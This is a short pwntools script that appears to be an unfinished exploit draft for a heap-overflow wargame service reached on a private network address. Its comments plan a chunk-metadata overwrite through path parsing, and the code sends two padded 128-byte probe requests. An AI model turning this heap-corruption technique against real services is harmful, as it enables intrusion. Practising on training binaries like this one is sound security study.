
from pwn import *


"""
- Give in input of size 128 such that :
    - starts with FSRD
    - has a "/" somewhere(lets call this point "s")
    - has a "ROOT" before the "/"
    - pointer named `start` moves backward till it finds a "/"(lets call this point "d")
    - after "d" we probably have the metadata for the next block that we can overwrite,
      by placing it at "s"(it will get copied from d onward into the metadata)
    - However, that means we cannot use PREV_SIZE of "c" as the "SIZE" of chunk after c.

    => We need to be able to place the following at programmable offsets
        => crafted chunk
        => chunk after c
    => Also we need to stop using PREV_SIZE of c as SIZE of chunk after c

    Need someway to specify a string such that we can say what goes where
"""

REQSZ = 128
CHECK_PATH_ADDRESS = 0x804bcd0

p = remote("192.168.5.199", 2993)

payload_1 = "FSRD" + "ROOT" + "%s" + "/" + "\n\0"
payload_1 = payload_1 % ("A" * (REQSZ - len(payload_1) + 2))
print len(payload_1)
assert len(payload_1) == 128
p.send(payload_1)

payload_2 = "FSRT" + "ROOT" + "%s" + "/" + "\n\0"
payload_2 = payload_2 % ("A" * (REQSZ - len(payload_2) + 2))
print len(payload_2)
assert len(payload_2) == 128
p.send(payload_2)


print p.recvline()

